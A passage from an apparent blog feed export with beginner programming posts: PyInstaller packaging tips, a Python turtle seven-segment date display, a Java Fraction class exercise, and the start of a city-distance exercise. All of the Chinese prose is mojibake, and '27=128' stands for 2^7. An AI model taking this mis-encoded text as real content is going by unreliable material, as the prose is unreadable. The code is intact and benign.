<h2 id="Pythonç¨‹åºæ‰“åŒ…ä¸ºexe-Pyinstaller"><a href="#Pythonç¨‹åºæ‰“åŒ…ä¸ºexe-Pyinstaller" class="headerlink" title="Pythonç¨‹åºæ‰“åŒ…ä¸ºexe(Pyinstaller)"></a>Pythonç¨‹åºæ‰“åŒ…ä¸ºexe(Pyinstaller)</h2><h3 id="å®‰è£…åŠä½¿ç”¨"><a href="#å®‰è£…åŠä½¿ç”¨" class="headerlink" title="å®‰è£…åŠä½¿ç”¨"></a>å®‰è£…åŠä½¿ç”¨</h3><ol>
<li>ä½¿ç”¨<code>pip install pywin32</code>å®‰è£…pywin32</li>
<li>ä½¿ç”¨<code>pip install PyInstaller</code>å®‰è£…Pyinstaller</li>
<li>ä½¿ç”¨<code>pyinstaller -F main.py</code>å³å¯å°†Pythonç¨‹åºæ‰“åŒ…ä¸ºexeç¨‹åº</li>
</ol>
<h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul>
<li>æ‰“åŒ…ä¹‹å‰åº”å°†ç”¨åˆ°çš„ç¬¬ä¸‰æ–¹åº“(æ­¤é¡¹ç›®ä»…ç”¨åˆ°Twilio)å¤åˆ¶åˆ°ä¸è¦æ‰“åŒ…çš„pyæ–‡ä»¶åŒä¸€ç›®å½•ä¸‹ã€‚</li>
<li>å¯ä½¿ç”¨<code>pyinstaller -F -i logo.ico main.py</code>,ä¸ºç”Ÿæˆçš„exeç¨‹åºæ·»åŠ å›¾æ ‡</li>
<li>ä½¿ç”¨çš„icoæ–‡ä»¶åƒç´ ä¸èƒ½è¿‡å°ï¼Œå¦åˆ™æœ‰å¯èƒ½å‡ºç°:æ‰“åŒ…åçš„ç¨‹åºå›¾æ ‡åªæœ‰åœ¨èµ„æºç®¡ç†å™¨ä¸­è®¾ç½®ä¸ºä»¥å°å›¾æ ‡æŸ¥çœ‹çš„æƒ…å†µä¸‹æ‰æ˜¾ç¤ºçš„æ˜¯è‡ªå·±çš„å›¾æ ‡ï¼Œå…¶ä»–æƒ…å†µä»æœªé»˜è®¤å›¾æ ‡</li>
</ul>
<h2 id="ä½¿ç”¨æˆªå›¾"><a href="#ä½¿ç”¨æˆªå›¾" class="headerlink" title="ä½¿ç”¨æˆªå›¾"></a>ä½¿ç”¨æˆªå›¾</h2><p><img data-src="/images/Screenshot_2018-03-13-09-32-23-47.jpg"><br><img data-src="/images/send_email.jpg"><br><img data-src="/images/20180426015859.jpg"></p>
<h2 id="å‚è€ƒåšå®¢"><a href="#å‚è€ƒåšå®¢" class="headerlink" title="å‚è€ƒåšå®¢"></a>å‚è€ƒåšå®¢</h2><ol>
<li><a href="https://blog.csdn.net/hanyou11/article/details/50756800">åº”ç”¨pythonå¯¹æ ¡å›­é€šçŸ¥çš„æ›´æ–°è¿›è¡Œæ¨é€</a></li>
<li><a href="https://blog.csdn.net/zyc121561/article/details/78169168">ä½¿ç”¨pythonå‘çŸ­ä¿¡ç»™è‡ªå·±çš„æ‰‹æœº</a></li>
<li><a href="https://www.cnblogs.com/gopythoner/p/6337543.html">Pythonæ‰“åŒ…æ–¹æ³•â€”â€”Pyinstaller</a></li>
</ol>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>çˆ¬è™«</tag>
        <tag>Twilio</tag>
        <tag>æ­£åˆ™è¡¨è¾¾å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨Pythonç»˜åˆ¶ä¸ƒæ®µæ•°ç ç®¡</title>
    <url>/posts/48183/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h2><p>æ•°ç ç®¡æ˜¯ä¸€ç§ä»·æ ¼ä¾¿å®œã€ä½¿ç”¨ç®€å•çš„å‘å…‰ç”µå­å™¨ä»¶ï¼Œå¹¿æ³›åº”ç”¨åœ¨ä»·æ ¼è¾ƒä½çš„ç”µå­ç±»äº§å“ä¸­ï¼Œå…¶ä¸­ï¼Œä¸ƒæ®µæ•°ç ç®¡æœ€ä¸ºå¸¸ç”¨ã€‚ä¸ƒæ®µæ•°ç ç®¡<br>ï¼ˆseven-segment indicatorï¼‰ç”±7 æ®µæ•°ç ç®¡æ‹¼æ¥è€Œæˆï¼Œæ¯æ®µæœ‰äº®æˆ–ä¸äº®ä¸¤ç§æƒ…å†µï¼Œæ”¹è¿›å‹çš„ä¸ƒæ®µæ•°ç ç®¡è¿˜åŒ…æ‹¬ä¸€ä¸ªå°æ•°ç‚¹ä½ç½®ï¼Œå¦‚å›¾1 æ‰€ç¤ºã€‚</p>
<span id="more"></span>
<p><img data-src="/images/20171205201558358.jpg"></p>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€å›¾ 1ï¼šä¸ƒæ®µæ•°ç ç®¡çš„ç»“æ„å›¾<br>ä¸ƒæ®µæ•°ç ç®¡èƒ½å½¢æˆ27&#x3D;128 ç§ä¸åŒçŠ¶æ€ï¼Œå…¶ä¸­éƒ¨åˆ†çŠ¶æ€èƒ½å¤Ÿæ˜¾ç¤ºæ˜“äºäººä»¬ç†è§£çš„æ•°å­—æˆ–å­—æ¯å«ä¹‰ï¼Œå› æ­¤è¢«å¹¿æ³›ä½¿ç”¨ã€‚å›¾2 ç»™å‡ºäº†åå…­è¿›åˆ¶ä¸­16 ä¸ªå­—ç¬¦çš„ä¸ƒæ®µæ•°ç ç®¡è¡¨ç¤ºã€‚<br><img data-src="/images/20171205201607868.jpg"><br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€å›¾ 2ï¼šåå…­è¿›åˆ¶ä¸­16 ä¸ªå­—ç¬¦çš„ä¸ƒæ®µæ•°ç ç®¡è¡¨ç¤º<br>è¯·é‡‡ç”¨turtle åº“å¹¶ä½¿ç”¨å‡½æ•°å°è£…ç»˜åˆ¶ä¸ƒæ®µæ•°ç ç®¡ï¼Œæ˜¾ç¤ºå½“å‰ç³»ç»Ÿæ—¥æœŸå’Œæ—¶é—´ã€‚è¯¥é—®é¢˜çš„IPO æè¿°å¦‚ä¸‹ï¼šè¾“å…¥ï¼šå½“å‰æ—¥æœŸçš„æ•°å­—å½¢å¼å¤„ç†ï¼šæ ¹æ®æ¯ä¸ªæ•°å­—ç»˜åˆ¶ä¸ƒæ®µæ•°ç ç®¡è¡¨ç¤ºè¾“å‡ºï¼šç»˜åˆ¶å½“å‰æ—¥æœŸçš„ä¸ƒæ®µæ•°ç ç®¡è¡¨ç¤ºç¨‹åºçš„é¢„æœŸè¿è¡Œæ•ˆæœå¦‚å›¾3 å’Œå›¾4 æ‰€ç¤ºï¼Œä¸ä¸¤ä¸ªæ•ˆæœä¸­ä»»ä½•ä¸€ä¸ªç›¸ä¼¼å‡å¯ã€‚<br><img data-src="/images/20171205201613806.jpg"><br><img data-src="/images/20171205201625796.jpg"></p>
<h2 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 5, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> turtle,datetime  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawGap</span>():<span class="comment">#ç”»æ•°ç ç®¡é—´éš”</span></span><br><span class="line">    turtle.penup()</span><br><span class="line">    turtle.fd(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawline</span>(<span class="params">flag</span>):<span class="comment">#ç”»å•æ¡æ•°ç ç®¡</span></span><br><span class="line">    drawGap()</span><br><span class="line">    turtle.pendown()</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="literal">False</span>):</span><br><span class="line">        turtle.penup()</span><br><span class="line">    turtle.fd(<span class="number">40</span>)</span><br><span class="line">    drawGap()</span><br><span class="line">    turtle.right(<span class="number">90</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawdight</span>(<span class="params">dight</span>):<span class="comment">#æ ¹æ®æ•°å­—ç»˜åˆ¶å¯¹åº”æ•°å­—çš„æ•°ç ç®¡</span></span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    turtle.left(<span class="number">90</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    turtle.setheading(<span class="number">0</span>)</span><br><span class="line">    turtle.fd(<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawdata</span>(<span class="params">data</span>):<span class="comment">#æ ¹æ®æ—¥æœŸç”»å‡ºå¯¹åº”æ•°å­—</span></span><br><span class="line">    turtle.color(<span class="string">&quot;red&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            turtle.write(<span class="string">&#x27;å¹´&#x27;</span>,font=(<span class="string">&quot;å®‹ä½“&quot;</span>, <span class="number">24</span>, <span class="string">&quot;normal&quot;</span>))</span><br><span class="line">            turtle.color(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">            turtle.fd(<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            turtle.write(<span class="string">&#x27;æœˆ&#x27;</span>,font=(<span class="string">&quot;å®‹ä½“&quot;</span>, <span class="number">24</span>, <span class="string">&quot;normal&quot;</span>))</span><br><span class="line">            turtle.color(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">            turtle.fd(<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            turtle.write(<span class="string">&#x27;æ—¥&#x27;</span>,font=(<span class="string">&quot;å®‹ä½“&quot;</span>, <span class="number">24</span>, <span class="string">&quot;normal&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            drawdight(<span class="built_in">eval</span>(i))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    turtle.setup(<span class="number">800</span>,<span class="number">500</span>)</span><br><span class="line">    turtle.penup()</span><br><span class="line">    turtle.fd(-<span class="number">350</span>)</span><br><span class="line">    turtle.pendown()</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    turtle.pensize(<span class="number">6</span>)</span><br><span class="line">    turtle.speed(<span class="number">9</span>)</span><br><span class="line">    drawdata(datetime.datetime.now().strftime(<span class="string">&#x27;%Y+%m-%d*&#x27;</span>))</span><br><span class="line">    a=<span class="built_in">input</span>()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img data-src="/images/20171205202005054.jpg"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸€å‘¨ç¼–ç¨‹é¢˜_åˆ†æ•°</title>
    <url>/posts/47907/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®å†…å®¹ï¼š"><a href="#é¢˜ç›®å†…å®¹ï¼š" class="headerlink" title="é¢˜ç›®å†…å®¹ï¼š"></a>é¢˜ç›®å†…å®¹ï¼š</h2><p>è®¾è®¡ä¸€ä¸ªè¡¨ç¤ºåˆ†æ•°çš„ç±»Fractionã€‚è¿™ä¸ªç±»ç”¨ä¸¤ä¸ªintç±»å‹çš„å˜é‡åˆ†åˆ«è¡¨ç¤ºåˆ†å­å’Œåˆ†æ¯ã€‚</p>
<p>è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°æ˜¯ï¼š<br>Fraction(int a, int b)<br>&#160; &#160; &#160; &#160;æ„é€ ä¸€ä¸ªa&#x2F;bçš„åˆ†æ•°ã€‚</p>
<span id="more"></span>

<p>è¿™ä¸ªç±»è¦æä¾›ä»¥ä¸‹çš„åŠŸèƒ½ï¼š<br>double toDouble();<br>&#160; &#160; &#160; &#160;å°†åˆ†æ•°è½¬æ¢double<br>Fraction plus(Fraction r);<br>&#160; &#160; &#160; &#160;å°†è‡ªå·±çš„åˆ†æ•°å’Œrçš„åˆ†æ•°ç›¸åŠ ï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„Fractionçš„å¯¹è±¡ã€‚æ³¨æ„å°å­¦å››å¹´çº§å­¦è¿‡ä¸¤ä¸ªåˆ†æ•°å¦‚ä½•ç›¸åŠ çš„å“ˆã€‚<br>Fraction multiply(Fraction r);<br>&#160; &#160; &#160; &#160;å°†è‡ªå·±çš„åˆ†æ•°å’Œrçš„åˆ†æ•°ç›¸ä¹˜ï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„Fractionçš„å¯¹è±¡ã€‚<br>void print();<br>&#160; &#160; &#160; &#160;å°†è‡ªå·±ä»¥â€œåˆ†å­&#x2F;åˆ†æ¯â€çš„å½¢å¼è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼Œå¹¶å¸¦æœ‰å›è½¦æ¢è¡Œã€‚å¦‚æœåˆ†æ•°æ˜¯1&#x2F;1ï¼Œåº”è¯¥è¾“å‡º1ã€‚å½“åˆ†å­å¤§äºåˆ†æ¯æ—¶ï¼Œä¸éœ€è¦æå‡ºæ•´æ•°éƒ¨åˆ†ï¼Œå³31&#x2F;30æ˜¯ä¸€ä¸ªæ­£ç¡®çš„è¾“å‡ºã€‚</p>
<p>æ³¨æ„ï¼Œåœ¨åˆ›å»ºå’Œåšå®Œè¿ç®—ååº”è¯¥åŒ–ç®€åˆ†æ•°ä¸ºæœ€ç®€å½¢å¼ã€‚å¦‚2&#x2F;4åº”è¯¥è¢«åŒ–ç®€ä¸º1&#x2F;2ã€‚</p>
<p>ä½ å†™çš„ç±»è¦å’Œä»¥ä¸‹çš„ä»£ç æ”¾åœ¨ä¸€èµ·ï¼Œå¹¶è¯·å‹¿ä¿®æ”¹è¿™ä¸ªä»£ç ï¼š</p>
<div class="note warnging"><p>
import java.util.Scanner;

<p>public class Main {</p>
<p>public static void main(String[] args) {<br>Scanner in &#x3D; new Scanner(System.in);<br>Fraction a &#x3D; new Fraction(in.nextInt(), in.nextInt());<br>Fraction b &#x3D; new Fraction(in.nextInt(),in.nextInt());<br>a.print();<br>b.print();<br>a.plus(b).print();<br>a.multiply(b).plus(new Fraction(5,6)).print();<br>a.print();<br>b.print();<br>in.close();<br>}<br>}</p>
</p></div>

<p>æ³¨æ„ï¼Œä½ çš„ç±»çš„å®šä¹‰åº”è¯¥è¿™æ ·å¼€å§‹ï¼š</p>
<p><code>class Fraction &#123;</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä½ çš„ç±»çš„classå‰é¢ä¸è¦æœ‰publicã€‚</p>
<h2 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼:"></a>è¾“å…¥æ ¼å¼:</h2><p>ç¨‹åºè¿è¡Œæ—¶ä¼šå¾—åˆ°å››ä¸ªæ•°å­—ï¼Œåˆ†åˆ«æ„æˆä¸¤ä¸ªåˆ†æ•°ï¼Œä¾æ¬¡æ˜¯åˆ†å­å’Œåˆ†æ¯ã€‚</p>
<h2 id="è¾“å‡ºæ ¼å¼ï¼š"><a href="#è¾“å‡ºæ ¼å¼ï¼š" class="headerlink" title="è¾“å‡ºæ ¼å¼ï¼š"></a>è¾“å‡ºæ ¼å¼ï¼š</h2><p>è¾“å‡ºä¸€äº›ç®—å¼ã€‚è¿™äº›è¾“å…¥å’Œè¾“å‡ºéƒ½æ˜¯ç”±Mainç±»çš„ä»£ç å®Œæˆçš„ï¼Œä½ çš„ä»£ç ä¸è¦åšè¾“å…¥å’Œè¾“å‡ºã€‚</p>
<h2 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>2 4 1 3
</p></div>

<h2 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>1/2
1/3
5/6
1
1/2
1/3
</p></div>

<p><strong>æ—¶é—´é™åˆ¶ï¼š500mså†…å­˜é™åˆ¶ï¼š32000kb</strong></p>
<h2 id="ä»£ç å¦‚ä¸‹ï¼š"><a href="#ä»£ç å¦‚ä¸‹ï¼š" class="headerlink" title="ä»£ç å¦‚ä¸‹ï¼š"></a>ä»£ç å¦‚ä¸‹ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">First_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">		<span class="type">Fraction</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(in.nextInt(), in.nextInt());</span><br><span class="line">		<span class="type">Fraction</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(in.nextInt(), in.nextInt());</span><br><span class="line">		a.print();</span><br><span class="line">		b.print();</span><br><span class="line">		a.plus(b).print();</span><br><span class="line">		a.multiply(b).plus(<span class="keyword">new</span> <span class="title class_">Fraction</span>(<span class="number">5</span>, <span class="number">6</span>)).print();</span><br><span class="line">		a.print();</span><br><span class="line">		b.print();</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fraction</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> a;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Fraction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">		<span class="built_in">this</span>.a = a;</span><br><span class="line">		<span class="built_in">this</span>.b = b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Fraction <span class="title function_">plus</span><span class="params">(Fraction r)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">aa</span> <span class="operator">=</span> a * r.b + r.a * b;</span><br><span class="line">		<span class="type">int</span> <span class="variable">bb</span> <span class="operator">=</span> b * r.b;</span><br><span class="line">		<span class="type">Fraction</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(aa, bb);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Fraction <span class="title function_">multiply</span><span class="params">(Fraction r)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">aa</span> <span class="operator">=</span> a * r.a;</span><br><span class="line">		<span class="type">int</span> <span class="variable">bb</span> <span class="operator">=</span> b * r.b;</span><br><span class="line">		<span class="type">Fraction</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(aa, bb);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="type">double</span> <span class="title function_">toDouble</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> a * <span class="number">1.0</span> / b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> a, y = b, r = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (y != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			r = x % y;</span><br><span class="line">			x = y;</span><br><span class="line">			y = r;</span><br><span class="line">		&#125;</span><br><span class="line">		a /= x;</span><br><span class="line">		b /= x;</span><br><span class="line">		<span class="keyword">if</span> (a == b)</span><br><span class="line">			System.out.println(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			System.out.println(a + <span class="string">&quot;/&quot;</span> + b);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆå­¦Javaï¼ŒæŒ‰ç…§C++ä¸­çš„ä¹ æƒ¯ï¼Œå¼€å§‹çš„æ—¶å€™æœæ–­å†™æˆäº†ä¸‹å›¾è¿™æ ·&#x2F;æ‚è„¸~<br>å¥½èœ~~</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Fraction <span class="title function_">plus</span><span class="params">(Fraction r)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">aa</span> <span class="operator">=</span> a * r.b + r.a * b;</span><br><span class="line">	<span class="type">int</span> <span class="variable">bb</span> <span class="operator">=</span> b * r.b;</span><br><span class="line">	Fraction <span class="title function_">temp</span><span class="params">(aa, bb)</span>;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸‰å‘¨ç¼–ç¨‹é¢˜_æŸ¥æ‰¾é‡Œç¨‹</title>
    <url>/posts/25475/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®å†…å®¹ï¼š"><a href="#é¢˜ç›®å†…å®¹ï¼š" class="headerlink" title="é¢˜ç›®å†…å®¹ï¼š"></a>é¢˜ç›®å†…å®¹ï¼š</h2><p>ä¸‹å›¾ä¸ºå›½å†…ä¸»è¦åŸå¸‚ä¹‹é—´çš„å…¬è·¯é‡Œç¨‹ï¼š</p>
<p><img data-src="/images/6630868754095812824.jpg"></p>
<p>ä½ çš„ç¨‹åºè¦è¯»å…¥è¿™æ ·çš„ä¸€å¼ è¡¨ï¼Œç„¶åï¼Œæ ¹æ®è¾“å…¥çš„ä¸¤ä¸ªåŸå¸‚çš„åç§°ï¼Œç»™å‡ºè¿™ä¸¤ä¸ªåŸå¸‚ä¹‹é—´çš„é‡Œç¨‹ã€‚</p>
<p>æ³¨æ„ï¼šä»»ä½•ä¸¤ä¸ªåŸå¸‚ä¹‹é—´çš„é‡Œç¨‹éƒ½å·²ç»ç»™å‡ºï¼Œä¸éœ€è¦è®¡ç®—ç»ç¬¬ä¸‰åœ°ä¸­è½¬ã€‚<br>æ³¨æ„ï¼šä½ å¹¶ä¸éœ€è¦å»å½•å…¥ä¸Šå›¾çš„æ•°æ®ï¼Œæ•°æ®æ˜¯åœ¨ç¨‹åºè¾“å…¥ä¸­ç»™çš„ã€‚</p>
<span id="more"></span>
<h2 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼:"></a>è¾“å…¥æ ¼å¼:</h2><p>é¦–å…ˆï¼Œä½ ä¼šè¯»åˆ°è‹¥å¹²ä¸ªåŸå¸‚çš„åå­—ã€‚æ¯ä¸ªåå­—éƒ½åªæ˜¯ä¸€ä¸ªè‹±æ–‡å•è¯ï¼Œä¸­é—´ä¸å«ç©ºæ ¼æˆ–å…¶ä»–ç¬¦å·ã€‚å½“è¯»åˆ°åå­—ä¸ºâ€œ###â€ï¼ˆä¸‰ä¸ª#å·ï¼‰æ—¶ï¼Œè¡¨ç¤ºåŸå¸‚åå­—è¾“å…¥ç»“æŸï¼Œ###å¹¶ä¸æ˜¯ä¸€ä¸ªåŸå¸‚çš„åå­—ã€‚å¦‚æœè®°è¯»åˆ°çš„åŸå¸‚åå­—çš„æ•°é‡ä¸ºnã€‚<br>ç„¶åï¼Œä½ ä¼šè¯»åˆ°nxnçš„ä¸€ä¸ªæ•´æ•°çŸ©é˜µã€‚ç¬¬ä¸€è¡Œçš„æ¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºä¸Šè¿°åŸå¸‚åå•ä¸­ç¬¬ä¸€ä¸ªåŸå¸‚ä¾æ¬¡åˆ°å¦ä¸€ä¸ªåŸå¸‚ä¹‹é—´çš„é‡Œç¨‹ã€‚è¡¨ä¸­åŒä¸€ä¸ªåŸå¸‚ä¹‹é—´çš„é‡Œç¨‹ä¸º0ã€‚<br>æœ€åï¼Œä½ ä¼šè¯»åˆ°ä¸¤ä¸ªåŸå¸‚çš„åå­—ã€‚</p>
